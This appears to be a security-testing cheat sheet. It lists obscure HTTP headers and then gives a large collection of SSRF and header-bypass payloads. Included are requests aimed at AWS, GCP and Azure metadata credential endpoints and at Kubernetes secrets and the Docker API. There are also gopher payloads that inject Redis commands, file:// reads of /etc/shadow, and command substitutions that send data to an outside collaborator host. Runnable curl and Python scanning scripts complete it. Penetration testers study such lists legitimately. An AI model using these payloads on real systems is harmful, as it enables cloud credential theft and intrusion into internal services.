# fuckheader
fuckheader

## 1. **Obsolete/Deprecated Headers**

### Legacy Headers Still Supported
```
PICS-Label: (PICS-1.1 "http://www.rsac.org/ratingsv01.html" l r (n 0 s 0 v 0 l 0))
Pragma: no-cache
Pragma: public
Pragma: private
Pragma: no-transform
Warning: 199 - "Miscellaneous warning"
Warning: 299 - "Persistent warning"
```

### Old HTTP/1.0 Headers
```
MIME-Version: 1.0
Content-Base: http://example.com
Content-Version: 1.0
Derived-From: document.pdf
Cost: 100
Content-Encoding: x-gzip
Content-Transfer-Encoding: binary
```

## 2. **Rare Request Headers**

### Client Hints (Often Forgotten)
```
Accept-CH: UA, Platform, Viewport-Width
Accept-CH-Lifetime: 86400
DPR: 2.0
Viewport-Width: 1920
Width: 800
Downlink: 1.5
ECT: 4g
RTT: 50
Save-Data: on
```

### Device and Browser Info
```
X-Device: mobile
X-Device-User-Agent: Dalvik/2.1.0
X-OperaMini-Phone-UA: NokiaN95/10.0.012
X-UCBrowser-Device: SM-G930F
X-MZ-Request-ID: 123456789
X-Screen-Resolution: 1920x1080
X-Pixel-Ratio: 2.0
X-Color-Depth: 24
```

## 3. **Proxy and CDN Obscure Headers**

### Lesser-Known Proxy Headers
```
Via: 1.0 fred, 1.1 example.com (Apache/1.1)
X-Cache: HIT from proxy-server-1
X-Cache-Lookup: HIT from proxy-server-1:8080
X-Cache-Status: stale
X-Served-By: cache-lhr6325-LHR
X-Cache-Hits: 128
X-Timer: S1689234567.123456
X-Request-ID: 7d9f5c8e-3a1b-4f2d-9e8c-1a2b3c4d5e6f
X-Varnish: 12345678 87654321
X-Varnish-Age: 120
Age: 3600
```

### Obscure Akamai Headers
```
X-Akamai-Request-ID: abc123
X-Akamai-Transformed: GET /image.jpg 9 135
X-Akamai-Cache-Remote: hit
X-Akamai-Edge-Control: no-store
X-Akamai-Config: config123
```

### Cloudflare Obscure
```
CF-RAY: 3e4d5f6a7b8c9d0e-LHR
CF-Connecting-IP: 192.168.1.100
CF-IPCountry: US
CF-Visitor: '{"scheme":"https"}'
CF-Cache-Status: REVALIDATED
CF-Edge-Cache: cache
CF-Worker: my-worker.example.com
```

## 4. **Security Headers (Often Misconfigured)**

### Obscure CSP Directives
```
Content-Security-Policy: require-trusted-types-for 'script'
Content-Security-Policy: trusted-types myPolicy
Content-Security-Policy: plugin-types application/pdf
Content-Security-Policy: sandbox allow-forms allow-scripts
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

### Rare CORS Headers
```
Access-Control-Expose-Headers: X-Custom-Header, X-Request-ID
Access-Control-Max-Age: 86400
Access-Control-Request-Private-Network: true
Access-Control-Allow-Private-Network: true
Cross-Origin-Resource-Policy: cross-origin
Cross-Origin-Opener-Policy: same-origin-allow-popups
Cross-Origin-Embedder-Policy: require-corp
```

## 5. **Authentication and Authorization**

### Obscure Auth Headers
```
X-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
X-API-Key: sk_live_1234567890abcdef
X-API-Secret: whsec_abcdef1234567890
X-Auth-Signature: sha256=abc123def456
X-Signature: RSA-SHA256=abc123
X-MAC: 1234567890abcdef
X-Nonce: 1234567890
X-Timestamp: 1689234567
Authorization: Digest username="admin", realm="example", nonce="abc123"
Authorization: AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20230101/us-east-1/s3/aws4_request
Proxy-Authorization: Basic base64encoded
```

## 6. **WebSocket and Real-Time Headers**

```
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
X-WebSocket-Request-ID: abc123
```

## 7. **Server and Framework Specific**

### Apache Specific
```
X-Forwarded-For-Source: proxy
X-Forwarded-By: proxy-server
X-Forwarded-Proto-Version: http/1.1
X-Cluster-Client-IP: 192.168.1.100
```

### Nginx Specific
```
X-Accel-Expires: 3600
X-Accel-Redirect: /internal/secret.pdf
X-Accel-Limit-Rate: 1024
X-Accel-Buffering: yes
X-Accel-Charset: utf-8
X-Original-URI: /index.php
X-Original-Args: page=home
X-Original-URL: /original/path
```

### IIS Specific
```
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2
MicrosoftSharePointTeamServices: 16.0.0.0
X-SharePointHealthScore: 0
SPRequestGuid: 12345678-9abc-def0-1234-56789abcdef0
```

### Java/Tomcat Specific
```
X-Powered-By: Servlet/3.0 JSP/2.2
X-Instance-ID: i-1234567890abcdef0
X-Application-Context: application:prod:8080
X-Request-ID: 1234567890
X-Session-ID: ABCDEF1234567890
```

## 8. **Geolocation and Language**

### Rare Geo Headers
```
X-Geo-Country: US
X-Geo-Region: California
X-Geo-City: Mountain View
X-Geo-Postal: 94043
X-Geo-Latitude: 37.422
X-Geo-Longitude: -122.084
X-Geo-Timezone: America/Los_Angeles
X-Geo-ASN: 15169
X-Geo-ISP: Google LLC
```

### Content Negotiation
```
Accept-Patch: application/json-patch+json
Accept-Post: application/xml
Accept-Features: *
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT
Accept-Charset: iso-8859-5, unicode-1-1;q=0.8
```

## 9. **Cache and ETag Oddities**

```
ETag: W/"123456-abc123"
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
If-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
If-None-Match: W/"123456-abc123"
If-Unmodified-Since: Wed, 21 Oct 2015 07:28:00 GMT
If-Range: Wed, 21 Oct 2015 07:28:00 GMT
Cache-Control: stale-while-revalidate=60
Cache-Control: stale-if-error=1200
Cache-Control: immutable
Cache-Control: max-stale=3600
Cache-Control: min-fresh=60
Cache-Control: only-if-cached
```

## 10. **Experimental and Draft Headers**

### IETF Draft Headers
```
Prefer: respond-async, wait=10
Preference-Applied: respond-async
Delta-Base: 123456
IM: feed
A-IM: feed
C-Ext: DoNotTrack
DNT: 1
Tk: N
Want-Digest: sha-256
Digest: sha-256=X48E9qOokqqrvdts8nOJRJN3OWDUoyWxBf7kbu9DBPE=
```

### W3C Working Drafts
```
X-Content-Duration: 120.5
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: master-only
X-Frame-Options: SAMEORIGIN
X-Content-Security-Policy: default-src 'self'
X-WebKit-CSP: default-src 'self'
```

## 11. **Tracking and Analytics**

```
X-Piwik-ID: 12345
X-Google-ID: GA1.2.1234567890.123456789
X-Yandex-ID: 1234567890123456789
X-Hotjar-ID: 1234567890
X-Mixpanel-ID: 1234567890abcdef
X-Amplitude-ID: 1234567890
X-Segment-ID: 1234567890
X-Kissmetrics-ID: 1234567890
X-Intercom-ID: 1234567890
X-Customer-ID: 12345
X-Session-ID: abc123def456
```

## 12. **Mobile and App Specific**

### Mobile App Headers
```
X-Platform: Android/iOS/Windows
X-App-Version: 3.2.1
X-App-Build: 1234
X-App-ID: com.example.app
X-Device-ID: 12345678-9abc-def0-1234-56789abcdef0
X-Device-Model: Pixel 6 Pro
X-Device-OS: Android 13
X-Device-OS-Version: 13.2.1
X-Device-Manufacturer: Google
X-Installation-ID: 12345678-9abc-def0-1234-56789abcdef0
X-Push-Token: fcm-1234567890abcdef
X-Ad-ID: 12345678-9abc-def0-1234-56789abcdef0
X-IDFA: 12345678-9abc-def0-1234-56789abcdef0
X-AAID: 12345678-9abc-def0-1234-56789abcdef0
```

## 13. **API Gateway and Microservices**

```
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1689234567
X-RateLimit-Reset-Time: 2023-07-13T10:00:00Z
X-RateLimit-Window: 3600
X-RateLimit-Policy: 1000;w=3600
X-API-Version: 2023-01-01
X-API-Deprecated: true
X-API-Sunset: 2024-01-01
X-API-Warning: This endpoint will be removed
X-Correlation-ID: 12345678-9abc-def0-1234-56789abcdef0
X-B3-TraceId: 1234567890abcdef
X-B3-SpanId: abcdef1234567890
X-B3-ParentSpanId: 1234567890abcdef
X-B3-Sampled: 1
X-Ot-Span-Context: abc123def456
```

## 14. **Error and Debug Headers**

```
X-Error-Code: 1234
X-Error-Message: Something went wrong
X-Error-Details: Database connection failed
X-Debug-ID: 12345678-9abc-def0-1234-56789abcdef0
X-Debug-Token: abc123def456
X-Debug-Time: 123.456ms
X-Debug-Memory: 12.34MB
X-Debug-Files: 42
X-Debug-Functions: 123
X-Debug-Classes: 67
```

## 15. **Load Balancer and Infrastructure**

```
X-LB-Node: lb-01.example.com
X-LB-Node-ID: i-1234567890abcdef0
X-Backend-Server: app-01.example.com:8080
X-Backend-Status: healthy
X-Backend-Time: 123ms
X-Upstream-Status: 200
X-Upstream-Response-Time: 0.123
X-Upstream-Addr: 10.0.0.1:8080
X-Upstream-Port: 8080
X-Cluster-Node: cluster-node-01
X-Cluster-Status: active
X-Datacenter: us-east-1
X-Availability-Zone: us-east-1a
X-Region: us-east-1
```

## 16. **Vendor Specific Oddities**

### Google Specific
```
X-Goog-Upload-Protocol: resumable
X-Goog-Upload-Command: start
X-Goog-Upload-Header-Content-Length: 123456
X-Goog-Upload-Status: active
X-GUploader-UploadID: ABC123DEF456
X-Google-Cloud-Auth-Token: ya29.abc123...
X-Google-Apps-Metadata: present
```

### Facebook Specific
```
X-FB-Debug: abc123def456
X-FB-Request-ID: 1234567890abcdef
X-FB-Rev: 1234567
X-FB-Connection-Type: WIFI
X-FB-Net-Quality: good
```

### Amazon Specific
```
X-Amz-Request-ID: 1234567890ABCDEF
X-Amz-Id-2: abc123def456ghi789jkl
X-Amz-Cf-Id: abc123def456==
X-Amz-Cf-Pop: LHR50-C1
X-Amz-Server-Side-Encryption: AES256
X-Amz-Version-Id: 1234567890abcdef
```

## 17. **Security Testing Goldmines**

### Headers That Might Leak Info
```
X-Real-IP: 192.168.1.100
X-Cluster-Client-IP: 10.0.0.1
X-Forwarded-Server: internal-web-01
X-Proxy-User-IP: 192.168.1.100
X-Original-Forwarded-For: 203.0.113.5
X-Original-Host: internal-admin.example.com
X-Original-Scheme: http
X-Rewrite-URL: /admin
X-Original-URL: /admin/delete
X-Backend-Host: db.internal.example.com
X-Backend-Port: 3306
X-Internal-Secret: abc123def456
X-Master-Key: sk_live_1234567890
```

### Headers That Can Cause Issues
```
X-Content-Type-Options: sniff
X-Frame-Options: ALLOWALL
X-Permitted-Cross-Domain-Policies: all
Cross-Origin-Resource-Policy: same-site
Cross-Origin-Opener-Policy: unsafe-none
Cross-Origin-Embedder-Policy: unsafe-none
```

## 18. **Combined Attack Payload**

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8080
X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin/delete
X-Rewrite-URL: /admin
X-HTTP-Method-Override: DELETE
X-Forwarded-Host: internal-admin:9000
X-Forwarded-Server: backend-01
X-Forwarded-Proto: https
Forwarded: for=172.16.0.1:8443;by=203.0.113.5:3128;proto=https
X-Originating-IP: 10.0.0.1
X-Client-IP: 192.168.1.100
X-API-Version: admin-v1
X-Debug: true
X-Test: true
X-Internal: true
Prefer: respond-async
X-Cache-Bypass: true
X-No-Cache: true
Pragma: no-cache
Cache-Control: no-cache, no-store, must-revalidate
X-Idempotency-Key: 12345678-9abc-def0-1234-56789abcdef0
X-Request-ID: 12345678-9abc-def0-1234-56789abcdef0
X-Correlation-ID: 12345678-9abc-def0-1234-56789abcdef0
```

## **Tools to Discover These Headers**

```bash
# Discover all headers from a server
curl -I -X OPTIONS http://target-site.com/
curl -D - http://target-site.com/ -o /dev/null

# Send random headers
for header in "X-Debug: true" "X-Test: true" "X-Internal: true"; do
  curl -H "$header" http://target-site.com/
done

# Python discovery script
python3 -c "
import requests
headers = {'X-Original-URL': '/admin', 'X-Rewrite-URL': '/admin', 'X-HTTP-Method-Override': 'DELETE'}
r = requests.get('http://target-site.com/', headers=headers)
print(r.status_code)
print(r.headers)
"
```

## 1. **URL Override Headers**

### Path and URL Manipulation
```
X-Original-URL: /admin/delete
X-Rewrite-URL: /admin
X-Replaced-Path: /internal/api
X-Real-URL: http://169.254.169.254/latest/meta-data/
X-Forwarded-URL: http://localhost:8080/admin
X-Accel-Redirect: /internal/secret
X-Accel-Proxy: http://169.254.169.254/
X-Sendfile: /etc/passwd
X-Sendfile-Type: http
```

### Backend Routing
```
X-Backend-Host: 169.254.169.254
X-Backend-Port: 80
X-Backend-Server: localhost:8080
X-Backend-URL: http://169.254.169.254/latest/meta-data/
X-Proxy-Host: 169.254.169.254
X-Proxy-Port: 80
X-Proxy-URL: http://169.254.169.254/
```

## 2. **Host Header SSRF**

### Basic Host Override
```
Host: 169.254.169.254
Host: 169.254.169.254:80
Host: localhost
Host: localhost:8080
Host: 127.0.0.1
Host: 127.0.0.1:22
Host: [::1]
Host: [::1]:80
```

### Internal Services
```
Host: 10.0.0.1  # Internal network
Host: 172.16.0.1  # Private network
Host: 192.168.1.1  # Local network
Host: 10.0.0.1:3306  # MySQL
Host: 10.0.0.1:6379  # Redis
Host: 10.0.0.1:9200  # Elasticsearch
Host: 10.0.0.1:27017  # MongoDB
Host: metadata.google.internal  # GCP
Host: 169.254.169.254  # AWS/Azure/GCP
```

## 3. **X-Forwarded Host SSRF**

```
X-Forwarded-Host: 169.254.169.254
X-Forwarded-Host: 169.254.169.254:80
X-Forwarded-Host: localhost:8080
X-Forwarded-Host: metadata.google.internal
X-Forwarded-Host: 10.0.0.1
X-Forwarded-Host: 192.168.1.1:22
X-Forwarded-Server: 169.254.169.254
X-Forwarded-Server: localhost
```

## 4. **Cloud Metadata Service Headers**

### AWS Metadata
```
Host: 169.254.169.254
X-Forwarded-Host: 169.254.169.254
X-Original-URL: /latest/meta-data/
X-Rewrite-URL: /latest/meta-data/iam/security-credentials/
X-Real-URL: http://169.254.169.254/latest/meta-data/
X-Forwarded-URL: http://169.254.169.254/latest/user-data/
X-Accel-Redirect: /latest/meta-data/
```

### AWS Specific Paths
```
/latest/meta-data/
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/admin
/latest/user-data/
/latest/meta-data/public-keys/
/latest/meta-data/network/
```

### GCP Metadata
```
Host: metadata.google.internal
Host: metadata.google.internal:80
X-Forwarded-Host: metadata.google.internal
X-Google-Metadata-Request: True
Metadata-Flavor: Google
X-Original-URL: /computeMetadata/v1/
X-Rewrite-URL: /computeMetadata/v1/instance/service-accounts/default/token
```

### GCP Specific Paths
```
/computeMetadata/v1/
/computeMetadata/v1/instance/service-accounts/
/computeMetadata/v1/instance/service-accounts/default/token
/computeMetadata/v1/instance/attributes/
/computeMetadata/v1/project/
```

### Azure Metadata
```
Host: 169.254.169.254
Metadata: true
X-Original-URL: /metadata/instance?api-version=2017-08-01
X-Rewrite-URL: /metadata/instance?api-version=2017-08-01
```

### Azure Specific
```
/metadata/instance?api-version=2017-08-01
/metadata/instance/network?api-version=2017-08-01
/metadata/instance/compute?api-version=2017-08-01
/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## 5. **Port Scanning via Headers**

### Common Service Ports
```
Host: localhost:22    # SSH
Host: localhost:80    # HTTP
Host: localhost:443   # HTTPS
Host: localhost:3306  # MySQL
Host: localhost:5432  # PostgreSQL
Host: localhost:6379  # Redis
Host: localhost:9200  # Elasticsearch
Host: localhost:27017 # MongoDB
Host: localhost:11211 # Memcached
Host: localhost:2181  # ZooKeeper
Host: localhost:8080  # Tomcat/Jenkins
Host: localhost:8443  # Tomcat SSL
Host: localhost:9000  # SonarQube
Host: localhost:9090  # Prometheus
Host: localhost:3000  # Grafana/Node
Host: localhost:5601  # Kibana
Host: localhost:5000  # Flask/Docker
Host: localhost:8000  # Django
Host: localhost:8081  # Jenkins
Host: localhost:15672 # RabbitMQ
Host: localhost:61616 # ActiveMQ
```

### Internal IP Ranges
```
# Class A
Host: 10.0.0.1
Host: 10.0.0.1:22
Host: 10.0.0.1:80
Host: 10.255.255.255

# Class B
Host: 172.16.0.1
Host: 172.16.0.1:443
Host: 172.31.255.255

# Class C
Host: 192.168.0.1
Host: 192.168.0.1:8080
Host: 192.168.255.255

# Localhost
Host: 127.0.0.1
Host: 127.0.0.1:1-65535
Host: 0.0.0.0
```

## 6. **URL Parameter SSRF Headers**

### Redirect Parameters
```
X-Forwarded-For: http://169.254.169.254/
X-Forwarded-Proto: http
X-Forwarded-Proto: https
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Port: 80
X-Forwarded-Port: 443
```

### Referer Based
```
Referer: http://169.254.169.254/latest/meta-data/
Referer: https://metadata.google.internal/
Referer: http://10.0.0.1/admin
Referer: http://localhost:8080/internal
Origin: http://169.254.169.254
Origin: http://10.0.0.1
```

## 7. **Authentication Bypass for Internal Services**

### Internal Auth Headers
```
X-Internal-Request: true
X-Internal-Auth: true
X-Internal-Token: admin
X-Internal-Secret: abc123
X-Internal-Key: 123456
X-Local-Request: true
X-Local-Auth: true
X-Proxy-Authorization: internal
X-Backend-Authorization: Bearer internal
X-Admin-Request: true
X-Debug-Request: true
X-Test-Request: true
X-Validate-Request: false
```

### Service Specific
```
X-Redis-Auth: password
X-MongoDB-Auth: admin:password
X-Elasticsearch-Auth: Basic YWRtaW46cGFzc3dvcmQ=
X-MySQL-Auth: root:password
X-PostgreSQL-Auth: postgres:password
```

## 8. **Protocol Smuggling Headers**

### Protocol Switching
```
X-Forwarded-Proto: http
X-Forwarded-Proto: https
X-Forwarded-Proto: gopher
X-Forwarded-Proto: dict
X-Forwarded-Proto: ftp
X-Forwarded-Proto: tftp
X-Forwarded-Proto: file
X-Forwarded-Proto: ldap
X-Forwarded-Proto: smb
X-Forwarded-Proto: redis
X-Forwarded-Proto: memcache
X-URL-Scheme: gopher
X-URL-Scheme: dict
```

### Gopher Protocol (Classic SSRF)
```
X-Original-URL: gopher://localhost:8080/_GET / HTTP/1.0%0d%0a
X-Rewrite-URL: gopher://169.254.169.254:80/_GET /latest/meta-data/ HTTP/1.0%0d%0a%0d%0a
X-Forwarded-URL: gopher://10.0.0.1:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a
```

## 9. **DNS Rebinding Headers**

### DNS Rebinding Payloads
```
Host: localhost
Host: 127.0.0.1
Host: 0.0.0.0
Host: 127.0.0.1.nip.io
Host: 169.254.169.254.nip.io
Host: localhost.mydomain.com
Host: 169.254.169.254.mydomain.com
X-Forwarded-Host: 127.0.0.1.nip.io
X-Forwarded-Host: 169.254.169.254.nip.io
```

## 10. **IPv6 SSRF Payloads**

### IPv6 Localhost
```
Host: [::1]
Host: [::1]:80
Host: [::1]:8080
X-Forwarded-Host: [::1]
X-Forwarded-Host: [::1]:443
X-Original-URL: http://[::1]:8080/admin
```

### IPv6 Metadata (Some clouds support IPv6)
```
Host: [::ffff:169.254.169.254]
Host: [::ffff:169.254.169.254]:80
Host: [::ffff:10.0.0.1]
X-Forwarded-Host: [::ffff:169.254.169.254]
```

## 11. **Combined SSRF Attack Headers**

### Full SSRF Probe
```
GET / HTTP/1.1
Host: 169.254.169.254
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 169.254.169.254
X-Original-URL: /latest/meta-data/
X-Rewrite-URL: /latest/meta-data/iam/security-credentials/
X-Forwarded-URL: http://169.254.169.254/latest/meta-data/
X-Backend-Host: 169.254.169.254
X-Backend-Port: 80
X-Proxy-Host: 169.254.169.254
X-Proxy-URL: http://169.254.169.254/
X-Accel-Redirect: /latest/meta-data/
X-Sendfile: http://169.254.169.254/latest/user-data/
X-Internal-Request: true
Metadata: true
```

### AWS Metadata Extraction
```
GET /latest/meta-data/ HTTP/1.1
Host: 169.254.169.254
X-Forwarded-Host: 169.254.169.254
X-Original-URL: /latest/meta-data/
```

```
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-Forwarded-Host: 169.254.169.254
X-Original-URL: /latest/meta-data/iam/security-credentials/
```

```
GET /latest/meta-data/iam/security-credentials/admin HTTP/1.1
Host: 169.254.169.254
X-Forwarded-Host: 169.254.169.254
X-Original-URL: /latest/meta-data/iam/security-credentials/admin
```

### GCP Metadata Extraction
```
GET /computeMetadata/v1/ HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
X-Forwarded-Host: metadata.google.internal
X-Original-URL: /computeMetadata/v1/
```

```
GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
X-Forwarded-Host: metadata.google.internal
X-Original-URL: /computeMetadata/v1/instance/service-accounts/default/token
```

## 12. **Internal Network Probing**

### Network Range Scanning
```
Host: 10.0.0.1
Host: 10.0.0.2
Host: 10.0.0.3
... (scan through range)
X-Forwarded-Host: 10.0.0.1
X-Forwarded-Host: 10.0.0.2
X-Forwarded-Host: 10.0.0.3
```

### Service Discovery
```
Host: 10.0.0.1:22    # SSH
Host: 10.0.0.1:80    # HTTP
Host: 10.0.0.1:443   # HTTPS
Host: 10.0.0.1:3306  # MySQL
Host: 10.0.0.1:5432  # PostgreSQL
Host: 10.0.0.1:6379  # Redis
Host: 10.0.0.1:9200  # Elasticsearch
Host: 10.0.0.1:27017 # MongoDB
```

## 13. **File Protocol SSRF**

### File Reading
```
X-Original-URL: file:///etc/passwd
X-Rewrite-URL: file:///etc/hosts
X-Forwarded-URL: file:///proc/self/environ
X-Accel-Redirect: file:///var/www/html/config.php
X-Sendfile: file:///etc/shadow
X-Proxy-URL: file:///c:/windows/win.ini
```

### File Inclusion
```
X-Original-URL: file:///etc/passwd%00
X-Original-URL: file:///etc/passwd%00.jpg
X-Original-URL: php://filter/convert.base64-encode/resource=/etc/passwd
X-Original-URL: expect://whoami
```

## 14. **Dict Protocol SSRF**

### Dict Service Probing
```
X-Original-URL: dict://localhost:11211/stats
X-Original-URL: dict://localhost:6379/info
X-Original-URL: dict://localhost:9200/
X-Forwarded-URL: dict://10.0.0.1:27017/
```

## 15. **Redis SSRF via Headers**

### Redis Command Injection
```
X-Original-URL: gopher://localhost:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a
X-Original-URL: gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0akey1%0d%0a$5%0d%0avalue1%0d%0a
X-Original-URL: gopher://localhost:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$5%0d%0a/tmp/%0d%0a
```

## 16. **Memcached SSRF**

### Memcached Stats
```
X-Original-URL: gopher://localhost:11211/_stats
X-Original-URL: gopher://localhost:11211/_get key1
X-Forwarded-URL: dict://localhost:11211/stats
```

## 17. **MongoDB SSRF**

### MongoDB Probing
```
X-Original-URL: http://localhost:27017/
X-Original-URL: http://localhost:27017/test?json=true
X-Forwarded-URL: gopher://localhost:27017/_*0%0d%0a
```

## 18. **Elasticsearch SSRF**

### Elasticsearch Queries
```
X-Original-URL: http://localhost:9200/
X-Original-URL: http://localhost:9200/_cat/indices
X-Original-URL: http://localhost:9200/_cluster/health
X-Forwarded-URL: http://10.0.0.1:9200/_nodes
```

## 19. **Docker API SSRF**

### Docker Socket Access
```
X-Original-URL: http://localhost:2375/containers/json
X-Original-URL: http://localhost:2375/images/json
X-Original-URL: http://localhost:2376/version
X-Forwarded-URL: http://10.0.0.1:2375/containers/create
X-Docker-API-Version: 1.40
```

### Docker Socket File
```
X-Original-URL: http://unix:/var/run/docker.sock:/containers/json
X-Original-URL: http://unix:/var/run/docker.sock:/images/json
```

## 20. **Kubernetes SSRF**

### K8s API Server
```
X-Original-URL: https://kubernetes.default.svc/api/v1/namespaces/default/pods
X-Original-URL: https://kubernetes.default.svc/api/v1/secrets
X-Original-URL: https://10.96.0.1:443/api/v1/namespaces/kube-system/secrets
X-Forwarded-Host: kubernetes.default.svc
Authorization: Bearer <token>
```

### Kubelet API
```
X-Original-URL: http://localhost:10250/pods
X-Original-URL: http://localhost:10255/pods
X-Original-URL: https://localhost:10250/exec/default/nginx/nginx
```

### etcd API
```
X-Original-URL: http://localhost:2379/v2/keys/
X-Original-URL: http://localhost:4001/v2/keys/
```

## 21. **Cloud Provider Specific**

### Alibaba Cloud
```
Host: 100.100.100.200
X-Original-URL: /latest/meta-data/
X-Forwarded-Host: 100.100.100.200
```

### DigitalOcean
```
Host: 169.254.169.254
X-Original-URL: /metadata/v1/
X-Forwarded-Host: 169.254.169.254
Metadata-Token: abc123
```

### OpenStack
```
Host: 169.254.169.254
X-Original-URL: /openstack/latest/meta_data.json
X-Forwarded-Host: 169.254.169.254
```

### Oracle Cloud
```
Host: 169.254.169.254
X-Original-URL: /opc/v1/instance/
X-Forwarded-Host: 169.254.169.254
Authorization: Bearer Oracle
```

## 22. **Blind SSRF Headers**

### Blind SSRF Probing
```
X-Original-URL: http://YOUR-COLLABORATOR-ID.burpcollaborator.net
X-Forwarded-URL: http://YOUR-COLLABORATOR-ID.burpcollaborator.net
X-Rewrite-URL: http://YOUR-COLLABORATOR-ID.burpcollaborator.net
X-Backend-Host: YOUR-COLLABORATOR-ID.burpcollaborator.net
Host: YOUR-COLLABORATOR-ID.burpcollaborator.net
Referer: http://YOUR-COLLABORATOR-ID.burpcollaborator.net
```

### DNS Based Blind SSRF
```
Host: $(whoami).YOUR-COLLABORATOR-ID.burpcollaborator.net
X-Forwarded-Host: $(id).YOUR-COLLABORATOR-ID.burpcollaborator.net
X-Original-URL: http://${env.HOSTNAME}.YOUR-COLLABORATOR-ID.burpcollaborator.net
```

## 23. **WAF Bypass SSRF Headers**

### Encoding Bypass
```
Host: 169.254.169.254 -> ①⑥⑨.②⑤④.①⑥⑨.②⑤④
X-Forwarded-Host: 0x7f.0x0.0x0.0x1  # 127.0.0.1 in hex
X-Original-URL: http://2130706433/  # 127.0.0.1 in decimal
X-Original-URL: http://017700000001/  # 127.0.0.1 in octal
```

### URL Encoding Bypass
```
X-Original-URL: http://169.254.169.254%2Flatest%2Fmeta-data%2F
X-Original-URL: http://169.254.169.254%00/latest/meta-data/
X-Original-URL: http://169.254.169.254#/latest/meta-data/
X-Original-URL: http://169.254.169.254?/latest/meta-data/
```

### Redirect Bypass
```
X-Original-URL: http://169.254.169.254/latest/meta-data/  # Direct
X-Original-URL: http://169.254.169.254/latest/meta-data/  # Follow redirects
X-Original-URL: http://169.254.169.254/latest/meta-data/  # Max redirects
```

## 24. **SSRF Testing Tools Commands**

### Curl Commands
```bash
# Basic SSRF test
curl -H "Host: 169.254.169.254" http://target-site.com/

# Multiple headers
curl -H "X-Original-URL: /latest/meta-data/" -H "Host: 169.254.169.254" http://target-site.com/

# Blind SSRF with collaborator
curl -H "X-Forwarded-URL: http://YOUR-ID.burpcollaborator.net" http://target-site.com/

# Port scan
for port in 80 443 22 3306 5432 6379 9200 27017; do
  curl -H "Host: 127.0.0.1:$port" http://target-site.com/
done
```

### Python Script
```python
import requests

ssrf_payloads = [
    {'Host': '169.254.169.254'},
    {'Host': '169.254.169.254', 'X-Original-URL': '/latest/meta-data/'},
    {'X-Forwarded-Host': '169.254.169.254'},
    {'X-Forwarded-URL': 'http://169.254.169.254/latest/meta-data/'},
    {'X-Rewrite-URL': '/latest/meta-data/', 'Host': '169.254.169.254'},
    {'Referer': 'http://169.254.169.254/latest/meta-data/'},
    {'X-Original-URL': 'gopher://169.254.169.254:80/_GET /latest/meta-data/ HTTP/1.0%0d%0a'},
]

for payload in ssrf_payloads:
    try:
        r = requests.get('http://target-site.com/', headers=payload, timeout=5)
        if r.status_code == 200 and 'iam' in r.text:
            print(f"SSRF SUCCESS: {payload}")
    except:
        pass
```

## 25. **Complete SSRF Testing Header Set**

```
GET / HTTP/1.1
Host: 169.254.169.254
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 169.254.169.254
X-Forwarded-Server: 169.254.169.254
X-Forwarded-Proto: http
X-Forwarded-Port: 80
X-Original-URL: /latest/meta-data/
X-Rewrite-URL: /latest/meta-data/
X-Replaced-Path: /latest/meta-data/
X-Real-URL: http://169.254.169.254/latest/meta-data/
X-Proxy-URL: http://169.254.169.254/latest/meta-data/
X-Accel-Redirect: /latest/meta-data/
X-Sendfile: http://169.254.169.254/latest/meta-data/
X-Backend-Host: 169.254.169.254
X-Backend-URL: http://169.254.169.254/latest/meta-data/
X-Proxy-Host: 169.254.169.254
Referer: http://169.254.169.254/latest/meta-data/
Origin: http://169.254.169.254
Metadata: true
Metadata-Flavor: Google
X-Google-Metadata-Request: True
X-Internal-Request: true
X-Debug: true
```

## **Critical SSRF Targets**

### Cloud Metadata Endpoints
```
AWS: http://169.254.169.254/latest/meta-data/
GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2017-08-01
DigitalOcean: http://169.254.169.254/metadata/v1/
Alibaba: http://100.100.100.200/latest/meta-data/
OpenStack: http://169.254.169.254/openstack/latest/meta_data.json
Oracle: http://169.254.169.254/opc/v1/instance/
```

### Internal Services
```
Docker: http://localhost:2375/containers/json
Kubernetes: https://kubernetes.default.svc/api/v1/secrets
Elasticsearch: http://localhost:9200/_cat/indices
Redis: gopher://localhost:6379/_INFO
Memcached: gopher://localhost:11211/_stats
MongoDB: http://localhost:27017/
MySQL: gopher://localhost:3306/_SELECT%20user()
PostgreSQL: gopher://localhost:5432/_SELECT%20version()
```


**Only test on systems you own or have explicit written permission to test.** Unauthorized SSRF testing is illegal and can result in criminal charges. Many cloud providers consider SSRF attacks as a violation of their terms of service and may pursue legal action.
